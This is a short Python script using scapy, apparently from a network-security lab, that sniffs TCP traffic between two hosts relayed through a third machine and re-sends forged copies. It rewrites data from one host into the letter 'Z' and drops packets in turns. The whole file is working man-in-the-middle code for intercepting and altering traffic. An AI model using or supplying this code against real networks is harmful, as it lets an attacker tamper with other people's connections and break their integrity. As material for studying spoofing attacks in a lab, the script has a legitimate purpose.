#!/usr/bin/python3

from scapy.all import *

blockA = False
blockB = True
hostA_MAC_addr = "08:00:27:a7:99:df"
hostB_MAC_addr = "08:00:27:7b:81:84"
hostM_MAC_addr = "08:00:27:58:67:fa"



def spoof_pkt(pkt):
	global blockA
	global blockB

	print("Original Packet......")
	print("Source IP: ", pkt[IP].src)
	print("Destination IP: ", pkt[IP].dst)
	print("Source MAC: ", pkt[Ether].src)
	print("Destination MAC: ", pkt[Ether].dst)

	a = IP()
	b = TCP()

	# Setup the IP header
	a.ihl = pkt[IP].ihl
	a.tos = pkt[IP].tos
	a.len = pkt[IP].len
	a.id = pkt[IP].id
	a.flags = pkt[IP].flags
	a.frag = pkt[IP].frag
	a.ttl = pkt[IP].ttl
	a.proto = pkt[IP].proto
	a.src = pkt[IP].src
	a.dst = pkt[IP].dst
	
	# Setup the TCP header
	b.sport = pkt[TCP].sport
	b.dport = pkt[TCP].dport
	b.seq = pkt[TCP].seq
	b.ack = pkt[TCP].ack
	b.dataofs = pkt[TCP].dataofs
	b.reserved = pkt[TCP].reserved
	b.flags = pkt[TCP].flags
	b.window = pkt[TCP].window
	b.urgptr = pkt[TCP].urgptr
	b.options = pkt[TCP].options

	data = pkt[TCP].payload
	
	if pkt[Ether].src == hostM_MAC_addr:
		return None
	
	if not blockA and pkt[Ether].src == hostA_MAC_addr and pkt[Ether].dst == hostM_MAC_addr and data and data.load != b"Z":
		# If there is data in the packet(not ACK) from Host A convert to 'Z' and block message from Host A		
		data.load = 'Z'
		blockA = True
		blockB = False
	elif not blockB and pkt[Ether].src == hostB_MAC_addr and pkt[Ether].dst == hostM_MAC_addr and data:
		# If there is data in the packet(not ACK) from Host B, pass through the message and block message from Host B
		blockB = True
		blockA = False
	elif blockA and pkt[Ether].src == hostA_MAC_addr and pkt[Ether].dst == hostM_MAC_addr:
		# Block all messages from Host A while waiting for Host B response
		return None
	elif blockB and pkt[Ether].src == hostB_MAC_addr and pkt[Ether].dst == hostM_MAC_addr:
		# Block all messages from Host B while waiting for Host A response
		return None

	newpkt = a/b/data

	print("Spoofed Packet......")
	print("Source IP: ", newpkt[IP].src)
	print("Destination IP:", newpkt[IP].dst)
	send(newpkt)
	print()

pkt = sniff(filter="tcp", prn=spoof_pkt)
